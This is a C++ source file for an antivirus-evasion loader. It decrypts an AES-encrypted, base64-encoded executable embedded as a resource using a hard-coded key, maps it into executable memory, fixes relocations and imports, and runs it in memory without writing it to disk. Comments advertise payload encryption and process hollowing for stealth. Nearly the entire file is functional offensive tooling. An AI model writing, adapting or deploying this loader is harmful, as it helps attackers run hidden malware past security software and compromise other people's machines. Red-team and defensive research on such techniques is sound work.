/**
	Daniel Zajork - @danzajork

	Evasion works to bypass antivirus software using a number of different techniques.
	* Payload encryption
	* In memory loading of a packed executable (no files dropped to disk)
	* Process hollowing 

	Use evasion_cryptor.py to encrypt the PE file to be executed.

	NOTE:
	Compie for x86 only.
	Compile with flag /Zc:threadSafeInit-
	source: https://github.com/fancycode/MemoryModule/issues/31
**/
#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS
#include "Main.h"
#include "resource.h"

#include <windows.h>
#include <winternl.h>
#include <winnt.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>
using std::string;
using std::wstring;

#include <openssl/evp.h>

#include "Helpers.h"

#ifndef IMAGE_SIZEOF_BASE_RELOCATION
#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
#endif

class Resource {
public:
	struct Parameters {
		std::size_t size_bytes = 0;
		void* ptr = nullptr;
	};
private:
	HRSRC hResource = nullptr;
	HGLOBAL hMemory = nullptr;

	Parameters p;

public:
	Resource(int resource_id, const std::string& resource_class) {
		hResource = FindResourceA(nullptr, MAKEINTRESOURCEA(resource_id), resource_class.c_str());
		hMemory = LoadResource(nullptr, hResource);

		p.size_bytes = SizeofResource(nullptr, hResource);
		p.ptr = LockResource(hMemory);
	}

	auto& GetResource() const {
		return p;
	}

	auto GetResourceString() const {
		std::string_view dst;
		if (p.ptr != nullptr)
			dst = std::string_view(reinterpret_cast<char*>(p.ptr), p.size_bytes);
		return dst;
	}
};

static inline void* OffsetPointer(void* data, ptrdiff_t offset) {

	return (void*)((uintptr_t)data + offset);
}

LPVOID CopyToCurrentProcessMemory(unsigned char* code) {

	unsigned char* new_pe_base = NULL;
	PIMAGE_DOS_HEADER current_pe_base = (PIMAGE_DOS_HEADER)code;

	// make sure we can find MZ in this PE
	if (current_pe_base->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	// make sure we can find the PE header
	PIMAGE_NT_HEADERS image_nt_header = (PIMAGE_NT_HEADERS)(current_pe_base->e_lfanew + (UINT_PTR)current_pe_base);
	if (image_nt_header->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	// allocate memory for the new image
	new_pe_base = (unsigned char*)VirtualAlloc(
		(LPVOID)(image_nt_header->OptionalHeader.ImageBase),
		image_nt_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (new_pe_base == NULL) {

		new_pe_base = (unsigned char*)VirtualAlloc(
			NULL,
			image_nt_header->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
	}

	if (new_pe_base == NULL) {
		return NULL;
	}

	memcpy(new_pe_base, (LPVOID)current_pe_base, image_nt_header->OptionalHeader.SizeOfHeaders);

	// update position
	PIMAGE_NT_HEADERS new_nt_header = (PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)new_pe_base)->e_lfanew + (UINT_PTR)new_pe_base);
	new_nt_header->OptionalHeader.ImageBase = (uintptr_t)new_pe_base;

	// grab the first section header
	PIMAGE_SECTION_HEADER pe_section_header = (PIMAGE_SECTION_HEADER)(current_pe_base->e_lfanew + sizeof(*image_nt_header) + (UINT_PTR)current_pe_base);
	for (int i = 0; i < image_nt_header->FileHeader.NumberOfSections; i++) {

		memcpy(
			(LPVOID)(pe_section_header->VirtualAddress + (UINT_PTR)new_pe_base),
			(LPVOID)(pe_section_header->PointerToRawData + (UINT_PTR)current_pe_base),
			pe_section_header->SizeOfRawData);

		pe_section_header++;
	}

	// Rebase the image if needed.  I can't say I understand all of the details yet 
	// but this helped a ton: https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c
	IMAGE_DATA_DIRECTORY directory = new_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	ptrdiff_t locationDelta = (ptrdiff_t)(new_nt_header->OptionalHeader.ImageBase - image_nt_header->OptionalHeader.ImageBase);
	PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((UINT_PTR)new_pe_base + directory.VirtualAddress);

	if (locationDelta == 0) {

		return new_pe_base;
	}

	for (; relocation->VirtualAddress > 0; ) {

		DWORD i;
		unsigned char* dest = new_pe_base + relocation->VirtualAddress;
		unsigned short* relInfo = (unsigned short*)OffsetPointer(relocation, IMAGE_SIZEOF_BASE_RELOCATION);

		for (i = 0; i < ((relocation->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++) {
			
			// the upper 4 bits define the type of relocation
			int type = *relInfo >> 12;
			
			// the lower 12 bits define the offset
			int offset = *relInfo & 0xfff;

			switch (type)
			{
				case IMAGE_REL_BASED_ABSOLUTE:
					// skip relocation
					break;

				case IMAGE_REL_BASED_HIGHLOW:
					// change complete 32 bit address
				{
					DWORD* patchAddress = (DWORD*)(dest + offset);
					*patchAddress += (DWORD)locationDelta;
				}
				break;

				default:
					break;
			}
		}

		// advance to next relocation block
		relocation = (PIMAGE_BASE_RELOCATION)OffsetPointer(relocation, relocation->SizeOfBlock);
	}

	return new_pe_base;
}

void AdjustImportAddressTable(PIMAGE_NT_HEADERS image_nt_header, PIMAGE_DOS_HEADER image_dos_header) {

	HMODULE module_handle;
	DWORD import_address_table_rva;
	SIZE_T import_address_table_size;

	// grab the import table
	/*
		The.idata section(or import table, as I prefer to call it) begins with an array
		of IMAGE_IMPORT_DESCRIPTORs.There is one IMAGE_IMPORT_DESCRIPTOR for each DLL that
		the PE file implicitly links to.There's no field indicating the number of structures
		in this array.Instead, the last element of the array is indicated by an
		IMAGE_IMPORT_DESCRIPTOR that has fields filled with NULLs.

		source: https://docs.microsoft.com/en-us/previous-versions/ms809762(v=msdn.10)?redirectedfrom=MSDN
	*/
	PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(image_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (UINT_PTR)image_dos_header);

	/*
		This field is an offset(an RVA) to an IMAGE_THUNK_DATA union.In almost every case,
		the union is interpreted as a pointer to an IMAGE_IMPORT_BY_NAME structure.If the field
		isn't one of these pointers, then it's supposedly treated as an export ordinal value for
		the DLL that's being imported. It's not clear from the documentation if you really can
		import a function by ordinal rather than by name.

		source: https://docs.microsoft.com/en-us/previous-versions/ms809762(v=msdn.10)?redirectedfrom=MSDN
	*/
	while (import_descriptor->Name) {

		PIMAGE_THUNK_DATA thunk;
		PIMAGE_THUNK_DATA first_thunk;

		module_handle = LoadLibraryA((LPCSTR)(import_descriptor->Name + (UINT_PTR)image_nt_header->OptionalHeader.ImageBase));
		first_thunk = (PIMAGE_THUNK_DATA)(import_descriptor->FirstThunk + (UINT_PTR)image_nt_header->OptionalHeader.ImageBase);
		if (import_descriptor->OriginalFirstThunk) {

			thunk = (PIMAGE_THUNK_DATA)(import_descriptor->OriginalFirstThunk + (UINT_PTR)image_nt_header->OptionalHeader.ImageBase);
		}
		else {

			thunk = (PIMAGE_THUNK_DATA)(import_descriptor->FirstThunk + (UINT_PTR)image_nt_header->OptionalHeader.ImageBase);
		}

		while (thunk->u1.Function) {

			PCHAR func_name;
			if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {

				first_thunk->u1.Function = (UINT_PTR)GetProcAddress(module_handle, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
			}
			else {

				func_name = (PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData))->Name + (UINT_PTR)image_nt_header->OptionalHeader.ImageBase);
				first_thunk->u1.Function = (UINT_PTR)GetProcAddress(module_handle, func_name);
			}

			first_thunk++;
			thunk++;
		}

		import_descriptor++;
	}

	return;
}

unsigned char* decrypt(unsigned char* ciphertext, int ciphertext_len, unsigned char* key) {

	EVP_CIPHER_CTX* ctx;
	int len= 0;
	int plaintext_len = 0;
	unsigned char* plaintext = new unsigned char[ciphertext_len + 16];
	
	ctx = EVP_CIPHER_CTX_new();
	
	EVP_DecryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, NULL);

	EVP_CIPHER_CTX_set_key_length(ctx, strlen((char*)key));
	
	EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len);

	plaintext_len = len;

	EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
	plaintext_len += len;

	EVP_CIPHER_CTX_free(ctx);
	return plaintext;
}

size_t calcDecodeLength(const char* b64input) { 

	size_t len = strlen(b64input),
		padding = 0;

	if (b64input[len - 1] == '=' && b64input[len - 2] == '=') 
		padding = 2;
	else if (b64input[len - 1] == '=')
		padding = 1;

	return (len * 3) / 4 - padding;
}

void Base64Decode(char* b64message, unsigned char** buffer, size_t* length) { 

	BIO* bio, * b64;

	int decodeLen = calcDecodeLength(b64message);
	*buffer = (unsigned char*)malloc(decodeLen + 1);
	(*buffer)[decodeLen] = '\0';

	bio = BIO_new_mem_buf(b64message, -1);
	b64 = BIO_new(BIO_f_base64());
	bio = BIO_push(b64, bio);

	BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL); 
	*length = BIO_read(bio, *buffer, strlen(b64message));
	BIO_free_all(bio);
}

DWORD WINAPI ExecuteCode(unsigned char* code) {

	PIMAGE_DOS_HEADER mapped_pe_file = (PIMAGE_DOS_HEADER)CopyToCurrentProcessMemory(code);
	PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(mapped_pe_file->e_lfanew + (UINT_PTR)mapped_pe_file);

	AdjustImportAddressTable(nt_header, mapped_pe_file);

	LPVOID original_entry_point = (LPVOID)(nt_header->OptionalHeader.AddressOfEntryPoint + (UINT_PTR)mapped_pe_file);

	((void(*)())(original_entry_point))();

	return 0;
}

int main() {

	// Must match one used in evasion_cryptor.py to generate evasion.txt
	unsigned char* key_hc = (unsigned char*)"01234567890123456789012345678901";
	
	Resource file(IDR_PAYLOAD, "TEXT");

	char* base64_encoded = new char[string(file.GetResourceString()).length() + 1];
	strcpy(base64_encoded, string(file.GetResourceString()).c_str());

	unsigned char* base64_decoded;
	size_t len;
	Base64Decode(base64_encoded, &base64_decoded, &len);

	unsigned char* code = decrypt(base64_decoded, (int)len, key_hc);

	ExecuteCode(code); // note this will execute code within the current process, use process hollowing method for better stealth
	
	return 0;
}